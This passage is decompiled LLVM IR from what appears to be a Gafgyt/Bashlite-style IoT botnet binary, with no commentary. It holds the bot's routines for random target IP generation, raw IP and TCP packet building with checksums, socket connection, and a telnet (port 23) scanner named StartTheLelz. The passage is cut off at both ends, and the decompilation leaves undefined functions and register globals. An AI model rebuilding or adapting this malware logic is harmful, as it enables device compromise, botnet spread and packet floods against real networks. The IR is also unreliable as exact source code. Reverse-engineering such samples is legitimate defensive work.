  uselistorder label %dec_label_pc_804a461, { 1, 0 }
  uselistorder label %dec_label_pc_804a42b, { 1, 0 }
  uselistorder label %dec_label_pc_804a3f5, { 1, 0 }
  uselistorder label %dec_label_pc_804a3bf, { 1, 0 }
  uselistorder label %dec_label_pc_804a389, { 1, 0 }
  uselistorder label %dec_label_pc_804a353, { 1, 0 }
  uselistorder label %dec_label_pc_804a31d, { 1, 0 }
  uselistorder label %dec_label_pc_804a2e7, { 1, 0 }
  uselistorder label %dec_label_pc_804a2b1, { 1, 0 }
  uselistorder label %dec_label_pc_804a27b, { 1, 0 }
  uselistorder label %dec_label_pc_804a245, { 1, 0 }
  uselistorder label %dec_label_pc_804a20f, { 1, 0 }
  uselistorder label %dec_label_pc_804a1d9, { 1, 0 }
  uselistorder label %dec_label_pc_804a1a3, { 1, 0 }
  uselistorder label %dec_label_pc_804a16d, { 1, 0 }
  uselistorder label %dec_label_pc_804a137, { 1, 0 }
  uselistorder label %dec_label_pc_804a101, { 1, 0 }
  uselistorder label %dec_label_pc_804a0cb, { 1, 0 }
  uselistorder label %dec_label_pc_804a095, { 1, 0 }
  uselistorder label %dec_label_pc_804a05f, { 1, 0 }
  uselistorder label %dec_label_pc_804a029, { 1, 0 }
  uselistorder label %dec_label_pc_8049ff3, { 1, 0 }
  uselistorder label %dec_label_pc_8049fbd, { 1, 0 }
  uselistorder label %dec_label_pc_8049f87, { 1, 0 }
  uselistorder label %dec_label_pc_8049f51, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804cc35 = load i32, i32* @ebp, align 4
  store i32 %v0_804cc35, i32* %stack_var_-4, align 4
  %v0_804cc3b = load i32, i32* @global_var_80627a8.240, align 8
  %v1_804cc43 = call i32 @ntohl(i32 %v0_804cc3b)
  %v5_804cc48 = and i32 %v1_804cc43, %arg1
  %v1_804cc4e = call i32 @rand_cmwc(i32 %v5_804cc48)
  %v1_804cc58 = sub i32 -1, %arg1
  %v2_804cc5a = and i32 %v1_804cc4e, %v1_804cc58
  %v5_804cc5c = xor i32 %v2_804cc5a, %v5_804cc48
  %v2_804cc5f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cc5f, i32* @ebp, align 4
  ret i32 %v5_804cc5c
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804cc66 = load i32, i32* @ebx, align 4
  %v4_804cc9534 = add i32 %arg2, -1
  %v9_804cc9535 = sub i32 0, %arg2
  %v10_804cc9536 = and i32 %arg2, %v9_804cc9535
  %v11_804cc9537 = icmp slt i32 %v10_804cc9536, 0
  %v12_804cc9538 = icmp eq i32 %v4_804cc9534, 0
  %v13_804cc9539 = icmp slt i32 %v4_804cc9534, 0
  %v3_804cc9940 = icmp eq i1 %v13_804cc9539, %v11_804cc9537
  %v4_804cc9941 = icmp eq i1 %v12_804cc9538, false
  %v5_804cc9942 = and i1 %v4_804cc9941, %v3_804cc9940
  br i1 %v5_804cc9942, label %dec_label_pc_804cc7a, label %dec_label_pc_804cc9b

dec_label_pc_804cc7a:                             ; preds = %entry, %dec_label_pc_804cc7a
  %stack_var_-24.046 = phi i16 [ %v9_804cc8a, %dec_label_pc_804cc7a ], [ 0, %entry ]
  %stack_var_8.045 = phi i32 [ %v4_804cc91, %dec_label_pc_804cc7a ], [ %arg2, %entry ]
  %stack_var_4.044 = phi i16* [ %v23_804cc8d, %dec_label_pc_804cc7a ], [ %arg1, %entry ]
  %v3_804cc8743 = phi i32 [ %v6_804cc87, %dec_label_pc_804cc7a ], [ 0, %entry ]
  %v4_804cc7a = ptrtoint i16* %stack_var_4.044 to i32
  %v2_804cc7d = load i16, i16* %stack_var_4.044, align 2
  %v3_804cc7d = zext i16 %v2_804cc7d to i32
  %sext52 = mul i32 %v3_804cc8743, 65536
  %v4_804cc87 = sdiv i32 %sext52, 65536
  %v6_804cc87 = add nsw i32 %v3_804cc7d, %v4_804cc87
  %v11_804cc87 = icmp ult i32 %v6_804cc87, %v4_804cc87
  %v26_804cc87 = trunc i32 %v6_804cc87 to i16
  %v7_804cc8a = zext i1 %v11_804cc87 to i16
  %v9_804cc8a = add i16 %v7_804cc8a, %stack_var_-24.046
  %v5_804cc8d = add i32 %v4_804cc7a, 2
  %v23_804cc8d = inttoptr i32 %v5_804cc8d to i16*
  %v4_804cc91 = add i32 %stack_var_8.045, -2
  %v4_804cc95 = add i32 %stack_var_8.045, -3
  %v9_804cc95 = sub i32 2, %stack_var_8.045
  %v10_804cc95 = and i32 %v4_804cc91, %v9_804cc95
  %v11_804cc95 = icmp slt i32 %v10_804cc95, 0
  %v12_804cc95 = icmp eq i32 %v4_804cc95, 0
  %v13_804cc95 = icmp slt i32 %v4_804cc95, 0
  %v3_804cc99 = icmp eq i1 %v13_804cc95, %v11_804cc95
  %v4_804cc99 = icmp eq i1 %v12_804cc95, false
  %v5_804cc99 = and i1 %v4_804cc99, %v3_804cc99
  br i1 %v5_804cc99, label %dec_label_pc_804cc7a, label %dec_label_pc_804cc9b

dec_label_pc_804cc9b:                             ; preds = %dec_label_pc_804cc7a, %entry
  %v3_804cc87.lcssa = phi i16 [ 0, %entry ], [ %v26_804cc87, %dec_label_pc_804cc7a ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_804cc8d, %dec_label_pc_804cc7a ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_804cc91, %dec_label_pc_804cc7a ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_804cc8a, %dec_label_pc_804cc7a ]
  %tmp19 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp19, label %dec_label_pc_804ccdc.preheader, label %dec_label_pc_804cca1

dec_label_pc_804cca1:                             ; preds = %dec_label_pc_804cc9b
  %v1_804cca4 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804cca4 = load i8, i8* %v1_804cca4, align 1
  %v3_804cca4 = zext i8 %v2_804cca4 to i32
  %v4_804ccaf = sext i16 %v3_804cc87.lcssa to i32
  %v6_804ccaf = add nsw i32 %v3_804cca4, %v4_804ccaf
  %v11_804ccaf = icmp ult i32 %v6_804ccaf, %v4_804ccaf
  %v26_804ccaf = trunc i32 %v6_804ccaf to i16
  %v7_804ccb2 = zext i1 %v11_804ccaf to i16
  %v9_804ccb2 = add i16 %v7_804ccb2, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804ccdc.preheader

dec_label_pc_804ccdc.preheader:                   ; preds = %dec_label_pc_804cca1, %dec_label_pc_804cc9b
  %v3_804ccc1.ph = phi i16 [ %v3_804cc87.lcssa, %dec_label_pc_804cc9b ], [ %v26_804ccaf, %dec_label_pc_804cca1 ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804cc9b ], [ %v9_804ccb2, %dec_label_pc_804cca1 ]
  %v4_804ccdc21 = sext i16 %v3_804ccc1.ph to i32
  %v4_804ccdf22 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804cce223 = udiv i32 %v4_804ccdc21, 65536
  %v4_804cce224 = mul i32 %v4_804ccdf22, 65536
  %v5_804cce225 = or i32 %v4_804cce224, %v3_804cce223
  %v2_804cce626 = udiv i32 %v4_804ccdf22, 65536
  %v2_804cce927 = or i32 %v5_804cce225, %v2_804cce626
  %v3_804cce928 = icmp eq i32 %v2_804cce927, 0
  %v1_804cced29 = icmp eq i1 %v3_804cce928, false
  br i1 %v1_804cced29, label %dec_label_pc_804ccb7, label %dec_label_pc_804ccef

dec_label_pc_804ccb7:                             ; preds = %dec_label_pc_804ccdc.preheader, %dec_label_pc_804ccb7
  %v2_804cce632 = phi i32 [ %v2_804cce6, %dec_label_pc_804ccb7 ], [ %v2_804cce626, %dec_label_pc_804ccdc.preheader ]
  %v5_804cce231 = phi i32 [ %v5_804cce2, %dec_label_pc_804ccb7 ], [ %v5_804cce225, %dec_label_pc_804ccdc.preheader ]
  %v4_804ccdc30 = phi i32 [ %v4_804ccdc, %dec_label_pc_804ccb7 ], [ %v4_804ccdc21, %dec_label_pc_804ccdc.preheader ]
  %v2_804ccd2 = add i32 %v5_804cce231, %v4_804ccdc30
  %v7_804ccd2 = icmp ult i32 %v2_804ccd2, %v4_804ccdc30
  %v3_804ccd4 = zext i1 %v7_804ccd2 to i32
  %v5_804ccd4 = add nuw nsw i32 %v3_804ccd4, %v2_804cce632
  %sext = mul i32 %v2_804ccd2, 65536
  %v4_804ccdc = sdiv i32 %sext, 65536
  %sext51 = mul i32 %v5_804ccd4, 65536
  %v4_804ccdf = sdiv i32 %sext51, 65536
  %v3_804cce2 = udiv i32 %v4_804ccdc, 65536
  %v5_804cce2 = or i32 %sext51, %v3_804cce2
  %v2_804cce6 = udiv i32 %v4_804ccdf, 65536
  %v2_804cce9 = or i32 %v5_804cce2, %v2_804cce6
  %v3_804cce9 = icmp eq i32 %v2_804cce9, 0
  %v1_804cced = icmp eq i1 %v3_804cce9, false
  br i1 %v1_804cced, label %dec_label_pc_804ccb7, label %dec_label_pc_804ccdc.dec_label_pc_804ccef_crit_edge

dec_label_pc_804ccdc.dec_label_pc_804ccef_crit_edge: ; preds = %dec_label_pc_804ccb7
  br label %dec_label_pc_804ccef

dec_label_pc_804ccef:                             ; preds = %dec_label_pc_804ccdc.dec_label_pc_804ccef_crit_edge, %dec_label_pc_804ccdc.preheader
  %v4_804ccdc.lcssa = phi i32 [ %v4_804ccdc, %dec_label_pc_804ccdc.dec_label_pc_804ccef_crit_edge ], [ %v4_804ccdc21, %dec_label_pc_804ccdc.preheader ]
  %v1_804ccf3 = urem i32 %v4_804ccdc.lcssa, 65536
  %v1_804ccf5 = xor i32 %v1_804ccf3, 65535
  store i32 %v0_804cc66, i32* @ebx, align 4
  ret i32 %v1_804ccf5

; uselistorder directives
  uselistorder i32 %v5_804cce2, { 1, 0 }
  uselistorder i32 %v4_804ccdc, { 1, 0, 2 }
  uselistorder i32 %v2_804cce626, { 1, 0 }
  uselistorder i32 %v4_804ccdf22, { 1, 0 }
  uselistorder i32 %v4_804ccdc21, { 2, 1, 0 }
  uselistorder i32 %v4_804ccaf, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804cc87.lcssa, { 1, 0 }
  uselistorder i32 %v4_804cc95, { 1, 0 }
  uselistorder i32 %v4_804cc91, { 0, 2, 1 }
  uselistorder i32 %v6_804cc87, { 1, 2, 0 }
  uselistorder i32 %v4_804cc87, { 1, 0 }
  uselistorder label %dec_label_pc_804ccb7, { 1, 0 }
  uselistorder label %dec_label_pc_804cc7a, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804cd00 = load i32, i32* @ebp, align 4
  store i32 %v0_804cd00, i32* %stack_var_-4, align 4
  %v4_804cd00 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804cd00, i32* @ebp, align 4
  %v1_804cd14 = add i32 %tmp10, 12
  %v2_804cd14 = inttoptr i32 %v1_804cd14 to i32*
  %v3_804cd14 = load i32, i32* %v2_804cd14, align 4
  %v1_804cd1d = add i32 %tmp10, 16
  %v2_804cd1d = inttoptr i32 %v1_804cd1d to i32*
  %v3_804cd1d = load i32, i32* %v2_804cd1d, align 4
  %v2_804cd32 = call i32 @htons(i16 20)
  %v1_804cd4b = call i32 @malloc(i32 32)
  store i32 %v1_804cd4b, i32* %ecx.global-to-local, align 4
  %v2_804cd5b = inttoptr i32 %v1_804cd4b to i32*
  store i32 %v3_804cd14, i32* %v2_804cd5b, align 4
  %v1_804cd60 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804cd60 = add i32 %v1_804cd60, 4
  %v3_804cd60 = inttoptr i32 %v2_804cd60 to i32*
  store i32 %v3_804cd1d, i32* %v3_804cd60, align 4
  %v1_804cd66 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804cd66 = add i32 %v1_804cd66, 8
  %v3_804cd66 = inttoptr i32 %v2_804cd66 to i32*
  store i32 0, i32* %v3_804cd66, align 4
  store i32 %tmp2, i32* %ecx.global-to-local, align 4
  %v1_804cd6f = add i32 %v1_804cd4b, 12
  store i32 %v1_804cd6f, i32* %edx.global-to-local, align 4
  %v1_804cd72 = inttoptr i32 %tmp2 to i32*
  %v2_804cd72 = load i32, i32* %v1_804cd72, align 4
  %v2_804cd74 = inttoptr i32 %v1_804cd6f to i32*
  store i32 %v2_804cd72, i32* %v2_804cd74, align 4
  %v0_804cd76 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cd76 = add i32 %v0_804cd76, 4
  %v2_804cd76 = inttoptr i32 %v1_804cd76 to i32*
  %v3_804cd76 = load i32, i32* %v2_804cd76, align 4
  %v1_804cd79 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cd79 = add i32 %v1_804cd79, 4
  %v3_804cd79 = inttoptr i32 %v2_804cd79 to i32*
  store i32 %v3_804cd76, i32* %v3_804cd79, align 4
  %v0_804cd7c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cd7c = add i32 %v0_804cd7c, 8
  %v2_804cd7c = inttoptr i32 %v1_804cd7c to i32*
  %v3_804cd7c = load i32, i32* %v2_804cd7c, align 4
  %v1_804cd7f = load i32, i32* %edx.global-to-local, align 4
  %v2_804cd7f = add i32 %v1_804cd7f, 8
  %v3_804cd7f = inttoptr i32 %v2_804cd7f to i32*
  store i32 %v3_804cd7c, i32* %v3_804cd7f, align 4
  %v0_804cd82 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cd82 = add i32 %v0_804cd82, 12
  %v2_804cd82 = inttoptr i32 %v1_804cd82 to i32*
  %v3_804cd82 = load i32, i32* %v2_804cd82, align 4
  %v1_804cd85 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cd85 = add i32 %v1_804cd85, 12
  %v3_804cd85 = inttoptr i32 %v2_804cd85 to i32*
  store i32 %v3_804cd82, i32* %v3_804cd85, align 4
  %v0_804cd88 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cd88 = add i32 %v0_804cd88, 16
  %v2_804cd88 = inttoptr i32 %v1_804cd88 to i32*
  %v3_804cd88 = load i32, i32* %v2_804cd88, align 4
  %v1_804cd8b = load i32, i32* %edx.global-to-local, align 4
  %v2_804cd8b = add i32 %v1_804cd8b, 16
  %v3_804cd8b = inttoptr i32 %v2_804cd8b to i32*
  store i32 %v3_804cd88, i32* %v3_804cd8b, align 4
  %v2_804cd9b = inttoptr i32 %v1_804cd4b to i16*
  %v3_804cd9b = call i32 @csum(i16* %v2_804cd9b, i32 32)
  %v1_804cda0 = urem i32 %v3_804cd9b, 65536
  %v1_804cdad = call i32 @free(i32 %v1_804cd4b)
  %v2_804cdb6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cdb6, i32* @ebp, align 4
  ret i32 %v1_804cda0

; uselistorder directives
  uselistorder i32 %v1_804cd4b, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804cdb8 = load i32, i32* @ebp, align 4
  store i32 %v0_804cdb8, i32* %stack_var_-4, align 4
  %v4_804cdbe = sext i8 %tmp8 to i32
  %v4_804cdc4 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804cddf = add i32 %v4_804cdc4, 1
  %v2_804cddf = inttoptr i32 %v1_804cddf to i8*
  store i8 0, i8* %v2_804cddf, align 1
  %v1_804cde9 = add i32 %tmp5, 20
  %v1_804cdf2 = trunc i32 %v1_804cde9 to i16
  %v3_804cdf2 = add i32 %v4_804cdc4, 2
  %v4_804cdf2 = inttoptr i32 %v3_804cdf2 to i16*
  store i16 %v1_804cdf2, i16* %v4_804cdf2, align 2
  %v2_804cdf6 = call i32 @rand_cmwc(i32 %v4_804cdbe)
  %v1_804ce01 = trunc i32 %v2_804cdf6 to i16
  %v3_804ce01 = add i32 %v4_804cdc4, 4
  %v4_804ce01 = inttoptr i32 %v3_804ce01 to i16*
  store i16 %v1_804ce01, i16* %v4_804ce01, align 2
  %v1_804ce08 = add i32 %v4_804cdc4, 6
  %v2_804ce08 = inttoptr i32 %v1_804ce08 to i16*
  store i16 0, i16* %v2_804ce08, align 2
  %v1_804ce11 = add i32 %v4_804cdc4, 8
  %v2_804ce11 = inttoptr i32 %v1_804ce11 to i8*
  store i8 -1, i8* %v2_804ce11, align 1
  %v3_804ce1c = add i32 %v4_804cdc4, 9
  %v4_804ce1c = inttoptr i32 %v3_804ce1c to i8*
  store i8 %tmp8, i8* %v4_804ce1c, align 1
  %v1_804ce22 = add i32 %v4_804cdc4, 10
  %v2_804ce22 = inttoptr i32 %v1_804ce22 to i16*
  store i16 0, i16* %v2_804ce22, align 2
  %v2_804ce2e = add i32 %v4_804cdc4, 12
  %v3_804ce2e = inttoptr i32 %v2_804ce2e to i32*
  %v2_804ce37 = add i32 %v4_804cdc4, 16
  %v3_804ce37 = inttoptr i32 %v2_804ce37 to i32*
  store i32 %tmp, i32* %v3_804ce37, align 4
  %v2_804ce3a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ce3a, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 3, 0, 2, 1 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v4_804ce42 = add i32 %arg1, -2
  %v9_804ce42 = sub i32 1, %arg1
  %v10_804ce42 = and i32 %v9_804ce42, %arg1
  %v11_804ce42 = icmp slt i32 %v10_804ce42, 0
  %v12_804ce42 = icmp eq i32 %v4_804ce42, 0
  %v13_804ce42 = icmp slt i32 %v4_804ce42, 0
  %v3_804ce46 = icmp eq i1 %v13_804ce42, %v11_804ce42
  %v4_804ce46 = icmp eq i1 %v12_804ce42, false
  %v5_804ce46 = and i1 %v4_804ce46, %v3_804ce46
  br i1 %v5_804ce46, label %dec_label_pc_804ce51, label %dec_label_pc_804ce63

dec_label_pc_804ce51:                             ; preds = %entry
  %v1_804ce57 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_804ce63

dec_label_pc_804ce63:                             ; preds = %entry, %dec_label_pc_804ce51
  %storemerge = phi i32 [ 0, %dec_label_pc_804ce51 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804ce42, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ce63, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ce68 = load i32, i32* @ebp, align 4
  store i32 %v0_804ce68, i32* %stack_var_-4, align 4
  %v4_804ce68 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ce68, i32* @ebp, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804ce82 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804ce8a = icmp eq i32 %v1_804ce82, 0
  %v1_804ce8e = icmp eq i1 %v4_804ce8a, false
  br i1 %v1_804ce8e, label %dec_label_pc_804ce9c, label %dec_label_pc_804cf61

dec_label_pc_804ce9c:                             ; preds = %entry
  %v1_804ce9f = add i32 %v1_804ce82, 12
  %v2_804ce9f = inttoptr i32 %v1_804ce9f to i32*
  %v3_804ce9f = load i32, i32* %v2_804ce9f, align 4
  %v1_804cea7 = add i32 %v1_804ce82, 16
  %v2_804cea7 = inttoptr i32 %v1_804cea7 to i32*
  %v3_804cea7 = load i32, i32* %v2_804cea7, align 4
  %v1_804ceaa = inttoptr i32 %v3_804cea7 to i32*
  %v2_804ceaa = load i32, i32* %v1_804ceaa, align 4
  %v15_804ceb3 = ptrtoint i32* %stack_var_-24 to i32
  %v3_804cebd = call i32 @bcopy(i32 %v2_804ceaa, i32 %v15_804ceb3, i32 %v3_804ce9f)
  %v2_804cec9 = call i32 @htons(i16 %arg2)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804cef2 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_804cefa = ptrtoint i32* %stack_var_-32 to i32
  %v5_804cf1f = call i32 @__GI_setsockopt(i32 %v3_804cef2, i32 6, i32 1, i32 %v2_804cefa, i32 4)
  %v13_804cf24 = icmp eq i32 %v3_804cef2, -1
  %v1_804cf28 = icmp eq i1 %v13_804cf24, false
  br i1 %v1_804cf28, label %dec_label_pc_804cf33, label %dec_label_pc_804cf61

dec_label_pc_804cf33:                             ; preds = %dec_label_pc_804ce9c
  %v2_804ceb0 = ptrtoint i32* %stack_var_-28 to i32
  %v3_804cf48 = call i32 @__libc_connect(i32 %v3_804cef2, i32 %v2_804ceb0, i32 16)
  %v10_804cf4d = icmp eq i32 %v3_804cf48, -1
  %v1_804cf50 = icmp eq i1 %v10_804cf4d, false
  br i1 %v1_804cf50, label %dec_label_pc_804cf5b, label %dec_label_pc_804cf61

dec_label_pc_804cf5b:                             ; preds = %dec_label_pc_804cf33
  br label %dec_label_pc_804cf61

dec_label_pc_804cf61:                             ; preds = %dec_label_pc_804cf33, %dec_label_pc_804ce9c, %entry, %dec_label_pc_804cf5b
  %stack_var_-44.0 = phi i32 [ %v3_804cef2, %dec_label_pc_804cf5b ], [ 0, %entry ], [ 0, %dec_label_pc_804ce9c ], [ 0, %dec_label_pc_804cf33 ]
  %v2_804cf64 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cf64, i32* @ebp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %v3_804cef2, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_804cf61, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804cf7f = call i32 @__GI_time(i32* null)
  store i32 %v2_804cf7f, i32* %eax.global-to-local, align 4
  store i32 %v2_804cf7f, i32* @ebx, align 4
  %v1_804cf86 = call i32 @rand_cmwc(i32 0)
  %v1_804cf8b = load i32, i32* @ebx, align 4
  %v2_804cf8b = xor i32 %v1_804cf8b, %v1_804cf86
  store i32 %v2_804cf8b, i32* @eax, align 4
  %v1_804cf90 = call i32 @srand(i32 %v2_804cf8b)
  store i32 %v1_804cf90, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-604, align 4
  %v2_804cfa5 = call i32 @htons(i16 23)
  %v2_804cfb4 = ptrtoint i32* %stack_var_-604 to i32
  %v15_804cfba = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_804cfba, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-596, align 4
  %v1_804cfd1 = call i32 @malloc(i32 513)
  store i32 %v1_804cfd1, i32* %edx.global-to-local, align 4
  store i32 513, i32* %eax.global-to-local, align 4
  %v3_804cff2 = inttoptr i32 %v1_804cfd1 to i8*
  %v4_804cff2 = call i32 @__GI_memset(i8* %v3_804cff2, i32 0, i32 513)
  %v2_804d008 = mul i32 %arg2, 28
  %v1_804d00d = add i32 %v2_804d008, 30
  %v2_804d010 = and i32 %v1_804d00d, -16
  %v0_804d016 = load i32, i32* @esp, align 4
  %v2_804d016 = sub i32 %v0_804d016, %v2_804d010
  %v1_804d028 = add i32 %v2_804d016, 35
  %v2_804d02b = and i32 %v1_804d028, -16
  %v2_804d048 = mul i32 %arg2, 5
  store i32 %v2_804d048, i32* %edx.global-to-local, align 4
  %v1_804d04e = inttoptr i32 %v2_804d02b to i8*
  store i32 %v2_804d02b, i32* @edi, align 4
  %v1_804d053 = and i32 %v1_804d028, -256
  store i32 %v1_804d053, i32* %eax.global-to-local, align 4
  %v5_804d055 = call i8* @_memset(i8* %v1_804d04e, i32 %v1_804d053, i32 %v2_804d048)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804d0e258 = icmp sgt i32 %arg2, 0
  br i1 %v5_804d0e258, label %dec_label_pc_804d060.lr.ph, label %dec_label_pc_804d0ef

dec_label_pc_804d060.lr.ph:                       ; preds = %entry
  %v2_804d0b4 = or i32 %v2_804d02b, 9
  br label %dec_label_pc_804d060

dec_label_pc_804d060:                             ; preds = %dec_label_pc_804d060, %dec_label_pc_804d060.lr.ph
  %storemerge259 = phi i32 [ 0, %dec_label_pc_804d060.lr.ph ], [ %v4_804d0d9, %dec_label_pc_804d060 ]
  %v2_804d074 = mul i32 %storemerge259, 28
  %v2_804d076 = add i32 %v2_804d074, %v2_804d02b
  store i32 %v2_804d076, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804d07e = inttoptr i32 %v2_804d076 to i32*
  store i32 0, i32* %v2_804d07e, align 4
  %v0_804d080 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d080 = add i32 %v0_804d080, 4
  store i32 %v1_804d080, i32* %eax.global-to-local, align 4
  %v0_804d083 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d083 = inttoptr i32 %v1_804d080 to i32*
  store i32 %v0_804d083, i32* %v2_804d083, align 4
  %v0_804d085 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d085 = add i32 %v0_804d085, 4
  store i32 %v1_804d085, i32* %eax.global-to-local, align 4
  %v0_804d088 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d088 = inttoptr i32 %v1_804d085 to i32*
  store i32 %v0_804d088, i32* %v2_804d088, align 4
  %v0_804d08a = load i32, i32* %eax.global-to-local, align 4
  %v1_804d08a = add i32 %v0_804d08a, 4
  store i32 %v1_804d08a, i32* %eax.global-to-local, align 4
  %v0_804d08d = load i32, i32* %edx.global-to-local, align 4
  %v2_804d08d = inttoptr i32 %v1_804d08a to i32*
  store i32 %v0_804d08d, i32* %v2_804d08d, align 4
  %v0_804d08f = load i32, i32* %eax.global-to-local, align 4
  %v1_804d08f = add i32 %v0_804d08f, 4
  store i32 %v1_804d08f, i32* %eax.global-to-local, align 4
  %v0_804d092 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d092 = inttoptr i32 %v1_804d08f to i32*
  store i32 %v0_804d092, i32* %v2_804d092, align 4
  %v0_804d094 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d094 = add i32 %v0_804d094, 4
  store i32 %v1_804d094, i32* %eax.global-to-local, align 4
  %v0_804d097 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d097 = inttoptr i32 %v1_804d094 to i32*
  store i32 %v0_804d097, i32* %v2_804d097, align 4
  %v0_804d099 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d099 = add i32 %v0_804d099, 4
  %v0_804d09c = load i32, i32* %edx.global-to-local, align 4
  %v2_804d09c = inttoptr i32 %v1_804d099 to i32*
  store i32 %v0_804d09c, i32* %v2_804d09c, align 4
  %v3_804d0b4 = add i32 %v2_804d0b4, %v2_804d074
  %v4_804d0b4 = inttoptr i32 %v3_804d0b4 to i8*
  store i8 1, i8* %v4_804d0b4, align 1
  %v1_804d0d1 = add i32 %v2_804d076, 24
  store i32 %v1_804d0d1, i32* %edx.global-to-local, align 4
  %v2_804d0d7 = inttoptr i32 %v1_804d0d1 to i32*
  store i32 %v1_804cfd1, i32* %v2_804d0d7, align 4
  %v4_804d0d9 = add nuw nsw i32 %storemerge259, 1
  store i32 %v4_804d0d9, i32* %eax.global-to-local, align 4
  %exitcond60 = icmp eq i32 %v4_804d0d9, %arg2
  br i1 %exitcond60, label %dec_label_pc_804d0ef, label %dec_label_pc_804d060

dec_label_pc_804d0ef:                             ; preds = %entry, %dec_label_pc_804d060, %dec_label_pc_804d0ef
  %stack_var_-48.0 = phi i32 [ %v4_804d0ef, %dec_label_pc_804d0ef ], [ 0, %dec_label_pc_804d060 ], [ 0, %entry ]
  %v4_804d0ef = add i32 %stack_var_-48.0, 1
  store i32 %v4_804d0ef, i32* %eax.global-to-local, align 4
  %v1_804d0f5 = mul i32 %v4_804d0ef, 4
  %v2_804d0f5 = add i32 %v1_804d0f5, ptrtoint ([10 x i8*]* @global_var_805c1c0.251 to i32)
  %v3_804d0f5 = inttoptr i32 %v2_804d0f5 to i32*
  %v4_804d0f5 = load i32, i32* %v3_804d0f5, align 4
  store i32 %v4_804d0f5, i32* %eax.global-to-local, align 4
